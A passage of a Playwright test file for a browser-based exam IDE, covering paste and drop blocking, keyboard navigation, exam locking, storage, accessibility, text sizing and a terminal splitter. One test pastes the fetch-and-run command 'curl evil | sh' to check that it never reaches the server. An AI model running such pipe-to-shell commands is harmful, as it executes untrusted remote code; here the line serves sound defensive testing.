  await expect.poll(() => server(page, 'server.pastes')).toEqual([{ target: 'editor', bytes: 15 }]);
  await expect(page.getByText(/Pasting text from outside the exam is not allowed/)).toBeVisible();
  await copy('copied inside');
  await paste('.cm-content', 'copied inside');
  await expect(editor).toContainText('copied inside');
  await openTerminal(page);
  await expect(page.getByRole('region', { name: 'Terminal 1 output' })).toContainText('student@workspace');
  expect(await paste('.xterm-helper-textarea', 'curl evil | sh')).toBe(true);
  expect(await server(page, 'server.typed.join("")')).not.toContain('curl evil');
  await expect.poll(() => server(page, 'server.pastes.length')).toBe(2);
  expect((await server(page, 'server.pastes'))[1]).toEqual({ target: 'terminal', bytes: 14 });
  expect(JSON.stringify(await server(page, 'server.requests'))).not.toContain('curl evil');
  // Files dragged in are not taken either.
  const dropped = await page.evaluate(() => {
    const data = new DataTransfer(); data.items.add(new File(['x'], 'x.c'));
    const event = new DragEvent('drop', { dataTransfer: data, bubbles: true, cancelable: true });
    document.querySelector('.cm-content').dispatchEvent(event);
    return event.defaultPrevented;
  });
  expect(dropped).toBe(true);
});

test('the file tree works from the keyboard', async ({ page }) => {
  await start(page);
  await page.getByRole('treeitem', { name: 'Makefile', exact: true }).focus();
  await page.keyboard.press('ArrowUp');
  await page.keyboard.press('ArrowUp');
  const src = page.getByRole('treeitem', { name: 'src', exact: true });
  await expect(src).toBeFocused();
  await page.keyboard.press('ArrowRight');
  await expect(src).toHaveAttribute('aria-expanded', 'true');
  await page.keyboard.press('ArrowRight');
  await expect(page.getByRole('treeitem', { name: 'list.cpp' })).toBeFocused();
  await page.keyboard.press('Enter');
  await expect(page.getByRole('tab', { name: /list\.cpp/ })).toHaveAttribute('aria-selected', 'true');
  await page.getByRole('treeitem', { name: 'list.cpp' }).focus();
  await page.keyboard.press('ArrowLeft');
  await expect(src).toBeFocused();
  await page.keyboard.press('ArrowLeft');
  await expect(src).toHaveAttribute('aria-expanded', 'false');
  await page.keyboard.press('F2');
  await expect(page.getByRole('dialog', { name: 'Rename src' })).toBeVisible();
  await page.keyboard.press('Escape');
  await expect(page.getByRole('dialog')).toHaveCount(0);
  await page.keyboard.press('Delete');
  await expect(page.getByRole('dialog', { name: 'Delete src?' })).toBeVisible();
  await page.keyboard.press('Escape');
  // F6 moves between the panes.
  await page.keyboard.press('F6');
  await expect(page.getByRole('textbox', { name: /Editor for/ })).toBeFocused();
});

test('an exam without a terminal has only Run and Check, in a console that takes no keys', async ({ page }) => {
  await start(page, { terminal: false });
  await expect(page.getByRole('button', { name: 'New terminal' })).toHaveCount(0);
  // With no terminal to open and none shown, there is nothing for a Terminal button to do.
  await expect(terminalButton(page)).toHaveCount(0);
  await page.getByRole('button', { name: 'Run', exact: true }).click();
  const output = page.getByRole('region', { name: 'Run output' });
  await expect(output).toContainText('list: 3 2 1');
  await output.click();
  await page.keyboard.type('whoami');
  expect(await server(page, 'server.typed')).toEqual([]);
  expect(await server(page, 'server.requests.filter(r => r.type === "pty.open").length')).toBe(0);
});

test('a locked exam hides the workspace, and what was typed is still there after the unlock', async ({ page }) => {
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  await editor.click();
  await page.keyboard.type('kept through the lock ');
  await page.evaluate(() => { window.__studentHarness.workspaceConnection('locked', 'Your exam is locked.'); window.__studentHarness.lock('away'); });
  await expect(page.getByRole('tree', { name: 'Project files' })).toBeHidden();
  await expect(page.getByText(/locked/i).first()).toBeVisible();
  await page.evaluate(() => { window.__studentHarness.unlock(0); window.__studentHarness.workspaceConnection('connected'); });
  await expect(page.getByRole('tree', { name: 'Project files' })).toBeVisible();
  await expect(page.getByRole('textbox', { name: /Editor for notes\.txt/ })).toContainText('kept through the lock');
  await expect.poll(() => file(page, 'notes.txt')).toContain('kept through the lock');
});

test('nothing of the workspace is written to the student\'s computer', async ({ page }) => {
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  await editor.click();
  await page.keyboard.type('secret work');
  await page.getByRole('button', { name: 'Run', exact: true }).click();
  await page.waitForTimeout(1300);
  expect(await page.evaluate(() => window.__storage)).toEqual([]);
  expect(await page.evaluate(() => localStorage.length + sessionStorage.length)).toBe(0);
  expect(await page.evaluate(async () => (await indexedDB.databases?.() ?? []).length)).toBe(0);
  expect(await page.evaluate(() => document.cookie)).toBe('');
});

test('the workspace has no critical accessibility problems', async ({ page }) => {
  await start(page);
  await openSrc(page);
  await openTerminal(page);
  await page.getByRole('button', { name: 'Run', exact: true }).click();
  await expect(page.getByRole('region', { name: 'Run output' })).toContainText('list: 3 2 1');
  const scan = async label => {
    // The exam toolbar is the question exams' own (two buttons whose label does not hold their text); it is left as it is.
    const result = await new AxeBuilder({ page }).exclude('header.toolbar').analyze();
    const serious = result.violations.filter(violation => ['critical', 'serious'].includes(violation.impact));
    expect(serious.map(v => `${v.impact} ${v.id}: ${v.help} :: ${v.nodes.map(n => `${n.target.join(' ')} ${n.failureSummary?.replace(/\n/g, ' ')}`).join(' | ')}`), label).toEqual([]);
  };
  await scan('workspace');
  await page.getByRole('treeitem', { name: 'Makefile', exact: true }).click({ modifiers: ['Alt'] });
  await expect(page.getByRole('region', { name: 'Editor (right)' })).toBeVisible();
  await scan('two panes');
  await page.getByRole('button', { name: 'Close Makefile' }).click();
  await expect(page.getByRole('region', { name: 'Editor', exact: true })).toBeVisible();
  await page.getByRole('button', { name: 'Tab actions' }).click();
  await expect(page.getByRole('menu', { name: 'Tab actions' })).toBeVisible();
  await scan('the tab actions menu');
  await page.keyboard.press('Escape');
  await page.getByRole('button', { name: 'File', exact: true }).click();
  await scan('the new file dialog');
  await page.keyboard.press('Escape');
  await page.getByRole('treeitem', { name: 'Makefile', exact: true }).click();
  await page.getByRole('button', { name: 'Delete', exact: true }).click();
  await scan('the delete dialog');
  await page.keyboard.press('Escape');
  await page.getByRole('button', { name: 'Finish exam…' }).click();
  await expect(page.getByRole('dialog', { name: 'Finish your exam now?' })).toBeVisible();
  await scan('the finish dialog');
});

for (const viewport of [{ width: 1280, height: 800 }, { width: 1000, height: 700 }, { width: 1920, height: 1080 }]) {
  test(`the workspace fits a ${viewport.width}x${viewport.height} window, with the editor and the terminal both in view`, async ({ page }) => {
    await start(page, {}, viewport);
    await openFile(page, 'notes.txt');
    await openTerminal(page);
    for (const target of [page.getByRole('textbox', { name: /Editor for/ }), page.getByRole('region', { name: 'Terminal 1 output' }), page.getByRole('group', { name: 'Workspace status' })]) await expect(target).toBeInViewport();
    const box = await page.getByRole('region', { name: 'Terminal 1 output' }).boundingBox();
    expect(box.height).toBeGreaterThan(80);
    expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true);
  });
}

// Focus loss is read from the native window's own events, which nothing in the page can cause (docs/tools/TEST-FOCUS.md). What the page
// can promise is that the IDE calls nothing native but the workspace's own methods and the snapshot poll; the manual script does the rest.
test('using the IDE calls no native method but the workspace ones and the poll', async ({ page }) => {
  await start(page);
  await page.evaluate(() => window.__studentHarness.nativeCallsReset());
  const editor = await openSrc(page);
  await editor.click();
  await page.keyboard.type('// typing in the editor\n');
  await openTerminal(page);
  await page.getByRole('textbox', { name: 'Terminal 1 input' }).focus();
  await page.keyboard.type('echo hello');
  await page.keyboard.press('Enter');
  await page.getByRole('tab', { name: /list\.cpp/ }).click();
  await editor.click();
  await page.getByRole('button', { name: 'Run', exact: true }).click();
  await page.getByRole('button', { name: 'Check', exact: true }).click();
  await page.getByRole('checkbox', { name: /Implement push_front/ }).check();
  await page.getByRole('button', { name: 'Save', exact: true }).click();
  await page.waitForTimeout(1200);
  const calls = await page.evaluate(() => window.__studentHarness.nativeCalls);
  // (Rules is the login form reading the server's rules for the address it was given; it is not the IDE's.)
  expect([...new Set(calls)].filter(name => name !== 'Rules').sort()).toEqual(['Snapshot', 'WorkspaceInput', 'WorkspaceRequest']);
});

test('the A+ and A− buttons size the editor and the terminals too', async ({ page }) => {
  await start(page);
  await openFile(page, 'notes.txt');
  await openTerminal(page);
  await expect(page.getByRole('region', { name: 'Terminal 1 output' })).toContainText('student@workspace');
  const sizes = () => page.evaluate(() => ({ editor: parseFloat(getComputedStyle(document.querySelector('.cm-content')).fontSize), terminal: parseFloat(getComputedStyle(document.querySelector('.xterm-rows')).fontSize) }));
  const before = await sizes();
  await page.getByRole('button', { name: 'Larger text' }).click();
  await page.getByRole('button', { name: 'Larger text' }).click();
  await expect.poll(async () => (await sizes()).editor).toBeGreaterThan(before.editor);
  await expect.poll(async () => (await sizes()).terminal).toBeGreaterThan(before.terminal);
  await page.getByRole('button', { name: 'Smaller text' }).click();
  await page.getByRole('button', { name: 'Smaller text' }).click();
  await page.getByRole('button', { name: 'Smaller text' }).click();
  await expect.poll(async () => (await sizes()).terminal).toBeLessThan(before.terminal);
});

test('a workspace that is still starting says so, and one that failed says to call the instructor', async ({ page }) => {
  await start(page);
  await page.evaluate(() => window.__studentHarness.workspaceStatus({ state: 'preparing' }));
  await expect(page.getByText('Your workspace is starting')).toBeVisible();
  await page.evaluate(() => window.__studentHarness.workspaceStatus({ state: 'running' }));
  await expect(page.getByText('Your workspace is starting')).toHaveCount(0);
  await page.evaluate(() => window.__studentHarness.workspaceStatus({ state: 'failed' }));
  await expect(page.getByText('could not be prepared')).toBeVisible();
});

test('finishing the exam asks first, saves and submits a copy, and then ends the session', async ({ page }) => {
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  await editor.click();
  await page.keyboard.press('Control+End');
  await page.keyboard.type('last words ');
  await page.getByRole('checkbox', { name: /Implement push_front/ }).check();
  await page.evaluate(() => window.__studentHarness.nativeCallsReset());
  // The button asks; nothing is submitted by it.
  await page.getByRole('button', { name: 'Finish exam…' }).click();
  const dialog = page.getByRole('dialog', { name: 'Finish your exam now?' });
  await expect(dialog).toContainText('You have ticked 1 of 2 items');
  await expect(dialog).toContainText('This is final');
  await expect(dialog).toContainText('You have not pressed Save yet');
  await expect(dialog.getByRole('button', { name: 'Keep working' })).toBeFocused();
  expect(await server(page, 'server.submits.length')).toBe(0);
  expect(await page.evaluate(() => window.__studentHarness.nativeCalls.includes('Submit'))).toBe(false);
  // Escape and the safe button put it away.
  await page.keyboard.press('Escape');
  await expect(dialog).toHaveCount(0);
  await page.getByRole('button', { name: 'Finish exam…' }).click();
  await page.getByRole('dialog', { name: 'Finish your exam now?' }).getByRole('button', { name: 'Keep working' }).click();
  await expect(dialog).toHaveCount(0);
  expect(await server(page, 'server.submits.length')).toBe(0);
  expect(await page.evaluate(() => window.__studentHarness.nativeCalls.includes('Submit'))).toBe(false);
  await expect(page.getByRole('tree', { name: 'Project files' })).toBeVisible();
  // Confirming saves what was typed, takes the copy, and ends the exam.
  await page.getByRole('button', { name: 'Finish exam…' }).click();
  await expect(page.getByRole('dialog', { name: 'Finish your exam now?' })).toContainText('not saved yet');
  await page.getByRole('dialog', { name: 'Finish your exam now?' }).getByRole('button', { name: 'Finish my exam' }).click();
  await expect(page.getByText('Submission closed')).toBeVisible();
  expect(await server(page, "server.submits.at(-1).get('notes.txt')")).toContain('last words');
  expect(await page.evaluate(() => window.__studentHarness.nativeCalls.includes('Submit'))).toBe(true);
  expect(await page.evaluate(() => window.__studentHarness.submitted)).toEqual({});
  await expect(page.getByRole('tree', { name: 'Project files' })).toHaveCount(0);
});

test('a student whose changes cannot be saved does not finish the exam', async ({ page }) => {
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  await editor.click();
  await page.keyboard.type('mine ');
  await page.evaluate(() => window.__studentHarness.workspaceServer.externalWrite('notes.txt', 'theirs\n'));
  await expect(page.getByRole('alert').filter({ hasText: 'This file changed in the terminal' })).toBeVisible();
  await page.evaluate(() => window.__studentHarness.nativeCallsReset());
  await page.getByRole('button', { name: 'Finish exam…' }).click();
  await page.getByRole('dialog', { name: 'Finish your exam now?' }).getByRole('button', { name: 'Finish my exam' }).click();
  await expect(page.getByText(/exam was not finished/)).toBeVisible();
  await expect(page.getByRole('dialog', { name: 'Finish your exam now?' })).toHaveCount(0);
  expect(await page.evaluate(() => window.__studentHarness.nativeCalls.includes('Submit'))).toBe(false);
  await expect(page.getByRole('tree', { name: 'Project files' })).toBeVisible();
});

// ---- room for the editor ----
test('the terminals take no room until one is wanted, and can be hidden and brought back', async ({ page }) => {
  await start(page, {}, { width: 1280, height: 800 });
  await openSrc(page);
  const panel = page.locator('.terminal-box');
  const editorBox = () => page.locator('.editor-box').boundingBox();
  await expect(panel).toBeHidden();
  await expect(page.getByText('No terminal open')).toHaveCount(0);
  const alone = (await editorBox()).height;
  // With no terminal open the editor has most of the window (the toolbar and the row of buttons are all that is above it).
  expect(alone).toBeGreaterThan(800 * 0.6);

  // Run shows the panel with its output, and the editor gives up part of its room but keeps the larger share.
  await page.getByRole('button', { name: 'Run', exact: true }).click();
  await expect(panel).toBeVisible();
  await expect(page.getByRole('region', { name: 'Run output' })).toContainText('list: 3 2 1');
  const shared = (await editorBox()).height;
  const terminalHeight = (await panel.boundingBox()).height;
  expect(shared).toBeLessThan(alone);
  expect(shared).toBeGreaterThan(terminalHeight);
  await expect(terminalButton(page)).toHaveAttribute('aria-pressed', 'true');

  // Hide: the panel goes, the editor has the room and the focus, and the terminal is still there, named with a count.
  await page.getByRole('button', { name: 'Hide the terminals' }).click();
  await expect(panel).toBeHidden();
  expect(Math.abs((await editorBox()).height - alone)).toBeLessThan(2);
  await expect(page.getByRole('textbox', { name: /Editor for/ })).toBeFocused();
  await expect(page.getByRole('button', { name: 'Terminal (1)' })).toHaveAttribute('aria-pressed', 'false');
  expect(await server(page, 'server.requests.filter(r => r.type === "pty.close").length')).toBe(0);

  // The button shows it again, and what the program printed is there.
  await terminalButton(page).click();
  await expect(panel).toBeVisible();
  await expect(page.getByRole('region', { name: 'Run output' })).toContainText('list: 3 2 1');

  // Closing the last terminal takes the panel away (no empty panel), the focus goes back to the editor, and the button opens a new one.
  await page.getByRole('button', { name: 'Close Run' }).click();
  await expect(panel).toBeHidden();
  await expect(page.getByRole('textbox', { name: /Editor for/ })).toBeFocused();
  await openTerminal(page);
  await expect(panel).toBeVisible();
  await expect(page.getByRole('textbox', { name: 'Terminal 1 input' })).toBeFocused();
});

test('F6 goes round the panes that are there: a hidden terminal panel is not one of them', async ({ page }) => {
  await start(page);
  const editor = await openSrc(page);
  await editor.click();
  await expect(editor).toBeFocused();
  await page.keyboard.press('F6');
  await expect(page.locator('[data-pane="todo"] :focus')).toHaveCount(1);
  await page.keyboard.press('Shift+F6');
  await expect(page.getByRole('textbox', { name: /Editor for/ })).toBeFocused();
  await openTerminal(page);
  // A terminal shown takes the keyboard (a frame later): only then is it put back in the editor.
  await expect(page.getByRole('textbox', { name: 'Terminal 1 input' })).toBeFocused();
  await page.getByRole('textbox', { name: /Editor for/ }).focus();
  await page.keyboard.press('F6');
  await expect(page.locator('[data-pane="terminal"] :focus')).toHaveCount(1);
});

test('the editor has its own A− and A+, which size the code and nothing else', async ({ page }) => {
  await start(page);
  const editor = await openSrc(page);
  const sizes = () => page.evaluate(() => ({ code: parseFloat(getComputedStyle(document.querySelector('.cm-content')).fontSize), files: parseFloat(getComputedStyle(document.querySelector('[data-pane="tree"]')).fontSize) }));
  const before = await sizes();
  const larger = page.getByRole('button', { name: 'Larger code text' });
  const smaller = page.getByRole('button', { name: 'Smaller code text' });
  await larger.click();
  await larger.click();
  await expect.poll(async () => (await sizes()).code).toBeGreaterThan(before.code * 1.25);
  expect((await sizes()).files).toBe(before.files);
  // A click leaves the student where they were working.
  await expect(editor).toBeFocused();

  // The keys of a code editor: Ctrl and + − 0. They are not typed into the file.
  await page.keyboard.press('Control+0');
  await expect.poll(async () => (await sizes()).code).toBe(before.code);
  await page.keyboard.press('Control+=');
  await expect.poll(async () => (await sizes()).code).toBeGreaterThan(before.code);
  await page.keyboard.press('Control+-');
  await page.keyboard.press('Control+-');
  await expect.poll(async () => (await sizes()).code).toBeLessThan(before.code);
  expect(await editor.innerText()).not.toMatch(/[=+0-]/);
  await expect(page.getByRole('button', { name: 'Smaller code text' })).toBeDisabled();
  await page.keyboard.press('Control+0');
  for (let i = 0; i < 6; i += 1) await page.keyboard.press('Control+=');
  await expect(larger).toBeDisabled();
  await expect(smaller).toBeEnabled();

  // The size is the editor's, not the file's: another file shows at the same size, and the line numbers go with it.
  const big = (await sizes()).code;
  await page.getByRole('treeitem', { name: 'main.cpp', exact: true }).click();
  await expect(page.getByRole('textbox', { name: /Editor for .*main\.cpp$/ })).toBeVisible();
  expect((await sizes()).code).toBe(big);
  expect(await page.evaluate(() => parseFloat(getComputedStyle(document.querySelector('.cm-lineNumbers')).fontSize))).toBe(big);

  // Nothing is written to the student's disk for it.
  expect(await page.evaluate(() => window.__storage)).toEqual([]);
});

test('the toolbar\'s A+ and the editor\'s A+ add up: the editor is the larger of the two', async ({ page }) => {
  await start(page);
  await openSrc(page);
  const code = () => page.evaluate(() => parseFloat(getComputedStyle(document.querySelector('.cm-content')).fontSize));
  const base = await code();
  await page.getByRole('button', { name: 'Larger text' }).click();
  const withToolbar = await code();
  expect(withToolbar).toBeGreaterThan(base);
  await page.getByRole('button', { name: 'Larger code text' }).click();
  expect(await code()).toBeGreaterThan(withToolbar);
});

// ---- the editor holds still ----
// The editor was drawn again from the start (and its scroll lost) at every snapshot of the model: the first keystroke of a file, every
// autosave, a tick, a terminal opening. These tests mark the lines the editor has drawn and see that they are the same ones afterwards.
const bigFile = Array.from({ length: 300 }, (_, i) => `line ${i} of the big file`).join('\n') + '\n';
async function inTheMiddleOfABigFile(page) {
  await start(page, { files: { ...project, 'big.txt': bigFile } }, { width: 1366, height: 768 });
  const editor = await openFile(page, 'big.txt');
  await editor.click();
  await page.keyboard.press('Control+Home');
  for (let i = 0; i < 120; i += 1) await page.keyboard.press('ArrowDown');
  // Not at the edge of the window: with the cursor on the last line in view, typing a character may scroll the line fully into view, by a line more or
  // less according to the fonts of the machine (found in CI); ten lines up it is in the middle of what is shown, and nothing needs to move.
  for (let i = 0; i < 10; i += 1) await page.keyboard.press('ArrowUp');
  await expect(page.getByRole('group', { name: 'Workspace status' })).toContainText('Nothing to save');
  // The connection and the server copy are told when the first answers come (a slow machine, as CI is, may not have had them yet): the toolbar is measured
  // with all it will say, so the time is where it stays.
  await expect(page.getByRole('group', { name: 'Workspace status' })).toContainText('Connected');
  await expect(page.getByRole('group', { name: 'Workspace status' })).toContainText('Server copy');
  await page.evaluate(() => document.querySelectorAll('.cm-line').forEach(line => { line.__drawn = true; }));
  return editor;
}
const held = page => page.evaluate(() => {
  const lines = [...document.querySelectorAll('.cm-line')];
  return { scroll: Math.round(document.querySelector('.cm-scroller').scrollTop), lines: lines.length, same: lines.filter(line => line.__drawn).length,
    focused: document.activeElement?.classList.contains('cm-content') ?? false };
});

test('an autosave does not draw the editor again, move its scroll, or move what is around it', async ({ page }) => {
  const editor = await inTheMiddleOfABigFile(page);
  // A wide font for the toolbar, as Linux uses when it has nothing better (DejaVu Sans, CI's): the bold "Unsaved changes" was wider than its place in it.
  await page.addStyleTag({ content: ':root { --font-sans: "DejaVu Sans" !important; }' });
  const status = page.getByRole('group', { name: 'Workspace status' });
  const place = () => page.evaluate(() => ({ time: Math.round(document.querySelector('header.toolbar [aria-label="Remaining time"]').getBoundingClientRect().left), tab: Math.round(document.querySelector('.tab.front').getBoundingClientRect().width), save: Math.round(document.querySelector('header.toolbar .save').getBoundingClientRect().width) }));
  const before = { ...(await held(page)), ...(await place()) };
  expect(before.scroll).toBeGreaterThan(1000);

  await page.keyboard.type('x');
  await expect(status).toContainText('Unsaved changes');
  const typing = { ...(await held(page)), ...(await place()) };
  await expect(status).toContainText(/Saved \d/);
  const saved = { ...(await held(page)), ...(await place()) };

  // Only the line that was typed in may be a new element; the scroll and the focus are where they were.
  for (const now of [typing, saved]) {
    expect(now.scroll).toBe(before.scroll);
    expect(now.lines).toBe(before.lines);
    expect(now.same).toBeGreaterThanOrEqual(before.lines - 1);
    expect(now.focused).toBe(true);
    // The time, the tab and the save text keep their size and place from a clean file to an unsaved one to a saved one.
    expect(now.time).toBe(before.time);
    expect(now.tab).toBe(before.tab);
    expect(now.save).toBe(before.save);
  }
  expect(await editor.innerText()).toContain('x');
  expect(await server(page, 'server.requests.filter(r => r.type === "fs.write").length')).toBe(1);
});

test('nor do the other changes the page shows: a TODO tick, a terminal opening, a file made elsewhere', async ({ page }) => {
  await inTheMiddleOfABigFile(page);
  const before = await held(page);
  await page.getByRole('checkbox', { name: /Implement push_front/ }).check();
  await page.getByRole('button', { name: 'Run', exact: true }).click();
  await expect(page.getByRole('region', { name: 'Run output' })).toContainText('list: 3 2 1');
  await page.evaluate(() => window.__studentHarness.workspaceServer.externalWrite('made_elsewhere.txt', 'hello\n'));
  await expect(page.getByRole('treeitem', { name: 'made_elsewhere.txt' })).toBeVisible();
  const after = await held(page);
  // The panel took part of the editor's height, so lines at its foot may have gone; the lines still there are the ones that were.
  expect(after.scroll).toBe(before.scroll);
  expect(after.same).toBeGreaterThan(before.lines / 2);
  expect(after.same).toBe(after.lines);
});

test('a trip to another tab keeps each file\'s cursor and scroll, also through a file that is not text', async ({ page }) => {
  await start(page, { files: { ...project, 'big.txt': bigFile, 'photo.png': '\u0089PNG\r\n\u001a\n\0\0\0\rIHDR' } }, { width: 1366, height: 768 });
  const editor = await openFile(page, 'big.txt');
  await editor.click();
  await page.keyboard.press('Control+Home');
  for (let i = 0; i < 120; i += 1) await page.keyboard.press('ArrowDown');
  for (let i = 0; i < 10; i += 1) await page.keyboard.press('ArrowUp');
  const where = () => page.evaluate(() => ({ line: Number(document.querySelector('.cm-activeLineGutter')?.textContent), scroll: Math.round(document.querySelector('.cm-scroller').scrollTop) }));
  const before = await where();
  expect(before.line).toBe(111);
  expect(before.scroll).toBeGreaterThan(1000);
  // Another text file, scrolled to the top: it is shown from where it was, and so is big.txt when it comes back.
  await openFile(page, 'notes.txt');
  await expect(page.getByRole('textbox', { name: 'Editor for notes.txt' })).toBeVisible();
  expect((await where()).scroll).toBe(0);
  await page.getByRole('tab', { name: /big\.txt/ }).click();
  await expect.poll(where).toEqual(before);
  // A file that is not text hides the editor while it is in front.
  await page.getByRole('treeitem', { name: 'photo.png', exact: true }).click();
  await expect(page.getByText('This file is not text, so it cannot be shown or edited here.')).toBeVisible();
  await page.getByRole('tab', { name: /big\.txt/ }).click();
  await expect.poll(where).toEqual(before);
});

// ---- the cursor after a change of the text size ----
// CodeMirror keeps the height it believes each line has, and moves the cursor up and down by it. It measures the lines again only when
// its content changes height or its theme changes: with the code shorter than the editor (a tall window), a size that came from the
// page's CSS alone left the old heights, and Down went from line 4 to 5, 7, 10, 14. The size is part of its theme now.
const listing = Array.from({ length: 27 }, (_, i) => `    int line_${i + 1} = ${i + 1}; // a line of code`).join('\n') + '\n';
const sizeChanges = {
  'the editor\'s A+ twice': async page => { for (let i = 0; i < 2; i += 1) await page.getByRole('button', { name: /Larger code text/ }).click(); },
  'the editor\'s A− once': page => page.getByRole('button', { name: /Smaller code text/ }).click(),
  'the toolbar\'s A+ twice': async page => { for (let i = 0; i < 2; i += 1) await page.getByRole('button', { name: 'Larger text' }).click(); },
  'the toolbar\'s A− once': page => page.getByRole('button', { name: 'Smaller text' }).click(),
  'both A+ twice': async page => { for (const name of ['Larger text', /Larger code text/]) for (let i = 0; i < 2; i += 1) await page.getByRole('button', { name }).click(); },
};
for (const [name, change] of Object.entries(sizeChanges)) {
  test(`the arrow keys move one line at a time after ${name}, in a window the code does not fill`, async ({ page }) => {
    await start(page, { files: { ...project, 'src/list.cpp': listing } }, { width: 1920, height: 1080 });
    const editor = await openSrc(page);
    await expect(editor).toContainText('line_27');
    await change(page);
    // Click in the text of line 4, as a person does, and walk down and back up.
    await page.locator('.cm-line').nth(3).click({ position: { x: 40, y: 4 } });
    const line = () => page.evaluate(() => Number(document.querySelector('.cm-activeLineGutter')?.textContent));
    expect(await line()).toBe(4);
    for (let expected = 5; expected <= 18; expected += 1) { await page.keyboard.press('ArrowDown'); expect(await line()).toBe(expected); }
    for (let expected = 17; expected >= 4; expected -= 1) { await page.keyboard.press('ArrowUp'); expect(await line()).toBe(expected); }
  });
}

// ----- the terminals' own text size and the splitter between the editor and the terminals (found in a manual test, 2026-11-16) -----

test('the terminals have their own A− and A+, which size the terminal text only, and the size is kept when a terminal is closed and another opened', async ({ page }) => {
  await start(page);
  await openSrc(page);
  await openTerminal(page);
  await expect(page.getByRole('region', { name: 'Terminal 1 output' })).toContainText('student@workspace');
  const sizes = () => page.evaluate(() => ({ editor: parseFloat(getComputedStyle(document.querySelector('.cm-content')).fontSize), terminal: parseFloat(getComputedStyle(document.querySelector('.terminal:not([hidden]) .xterm-rows')).fontSize) }));
  const larger = page.getByRole('button', { name: 'A+ Larger terminal text' });
  const smaller = page.getByRole('button', { name: 'A− Smaller terminal text' });
  const before = await sizes();
  const resizes = () => server(page, 'server.requests.filter(r => r.type === "pty.resize").length');
  const resizedBefore = await resizes();

  // A click on it keeps the keyboard in the terminal; the terminal text grows, the code does not, and the terminal is told its new size.
  await larger.click();
  await expect(page.getByRole('textbox', { name: 'Terminal 1 input' })).toBeFocused();
  await larger.click();
  await expect.poll(async () => (await sizes()).terminal).toBeGreaterThan(before.terminal + 2);
  expect((await sizes()).editor).toBe(before.editor);
  await expect.poll(resizes).toBeGreaterThan(resizedBefore);
  const zoomed = (await sizes()).terminal;

  // Closing the last terminal takes the panel away, and the next one opens at the size the student chose.
  await page.getByRole('button', { name: 'Close Terminal 1' }).first().click();
  await expect(page.locator('.terminal-box')).toBeHidden();
  await openTerminal(page);
  await expect(page.locator('.terminal:not([hidden]) .xterm-rows')).toBeVisible();
  await expect.poll(async () => (await sizes()).terminal).toBe(zoomed);

  // The ends of the scale disable the button: three more steps up from where it is (the scale has seven), then six down to the smallest.
  for (let i = 0; i < 3; i += 1) await larger.click();
  await expect(larger).toBeDisabled();
  for (let i = 0; i < 6; i += 1) await smaller.click();
  await expect(smaller).toBeDisabled();
  await expect.poll(async () => (await sizes()).terminal).toBeLessThan(before.terminal);
});

test('a splitter resizes the editor and the terminals with the pointer and with the keys, and keeps its place when the terminals are hidden and shown', async ({ page }) => {
  await start(page, {}, { width: 1280, height: 800 });
  await openSrc(page);
  await expect(page.getByRole('separator', { name: 'Resize the terminals' })).toHaveCount(0);
  await openTerminal(page);
  const splitter = page.getByRole('separator', { name: 'Resize the terminals' });
  await expect(splitter).toBeVisible();
  const heights = async () => ({ editor: (await page.locator('.editor-box').boundingBox()).height, terminal: (await page.locator('.terminal-box').boundingBox()).height });
  const share = async () => Number(await splitter.getAttribute('aria-valuenow'));
  // The page draws what the model says on the next frame, so what is read is waited for.
  const shareIs = value => expect(splitter).toHaveAttribute('aria-valuenow', String(value));
  const usual = await heights();
  await shareIs(35);

  // Dragging up gives the terminals room, and the editor loses it.
  const handle = await splitter.boundingBox();
  const x = handle.x + handle.width / 2;
  const y = handle.y + handle.height / 2;
  await page.mouse.move(x, y);
  await page.mouse.down();
  await page.mouse.move(x, y - 90, { steps: 8 });
  await page.mouse.up();
  await expect.poll(async () => (await heights()).terminal).toBeGreaterThan(usual.terminal + 70);
  expect((await heights()).editor).toBeLessThan(usual.editor - 70);
  await expect.poll(share).toBeGreaterThan(35);
  // The terminal is told its new size (the program in it draws for it).
  await expect.poll(() => server(page, 'server.requests.filter(r => r.type === "pty.resize").length')).toBeGreaterThan(0);

  // Dragging far down stops at the smallest terminal (never less than 6rem, so its tabs and a few lines show).
  const moved = await splitter.boundingBox();
  await page.mouse.move(x, moved.y + moved.height / 2);
  await page.mouse.down();
  await page.mouse.move(x, 790, { steps: 8 });
  await page.mouse.up();
  await shareIs(15);
  expect((await heights()).terminal).toBeGreaterThanOrEqual(96);

  // The keys: Home and End are the ends, the arrows a step, Enter the usual size.
  await splitter.focus();
  await page.keyboard.press('Home');
  await shareIs(75);
  await expect.poll(async () => (await heights()).editor).toBeGreaterThan(120);
  await page.keyboard.press('ArrowDown');
  await shareIs(70);
  await page.keyboard.press('ArrowUp');
  await page.keyboard.press('ArrowUp');
  await shareIs(75);
  await page.keyboard.press('End');
  await shareIs(15);
  await page.keyboard.press('Enter');
  await shareIs(35);
  await expect.poll(async () => Math.abs((await heights()).terminal - usual.terminal)).toBeLessThan(3);

  // Hidden and shown again, the terminals are as the student left them (a double click is the usual size).
  await page.keyboard.press('PageUp');
  await shareIs(50);
  await page.getByRole('button', { name: 'Hide the terminals' }).click();
  await expect(splitter).toHaveCount(0);
  await terminalButton(page).click();
  await expect(splitter).toBeVisible();
  await shareIs(50);
  await splitter.dblclick();
  await shareIs(35);
});

test('the splitter and the terminal text size touch nothing outside the page, and the terminals still fit in a small window', async ({ page }) => {
  await start(page, {}, { width: 1000, height: 700 });
  // The wide font that CI draws with (DejaVu Sans), where the toolbar is taller than in a narrow one.
  await page.addStyleTag({ content: ':root { --font-sans: "DejaVu Sans" !important; }' });
  await openSrc(page);
  await openTerminal(page);
  const splitter = page.getByRole('separator', { name: 'Resize the terminals' });
  await splitter.focus();
  await page.keyboard.press('Home');
  await page.getByRole('button', { name: 'A+ Larger terminal text' }).click();
  await page.keyboard.press('End');
  // Both panes still show, whatever the share: each has room (the page may be a few pixels taller than a small window, as the workspace has a minimum
  // height, and a wide font makes the toolbar taller: what is asked is that every part is in view).
  for (const selector of ['.editor-box', '.terminal-box']) expect((await page.locator(selector).boundingBox()).height).toBeGreaterThan(80);
  for (const target of [page.getByRole('textbox', { name: /Editor for/ }), page.getByRole('region', { name: 'Terminal 1 output' }), splitter]) await expect(target).toBeInViewport();
  expect(await page.evaluate(() => window.__storage.length)).toBe(0);
});

// ----- the column of the instructions and the files: wider and narrower, and the instructions taller or shorter (found before an evaluation, 2026-11-19:
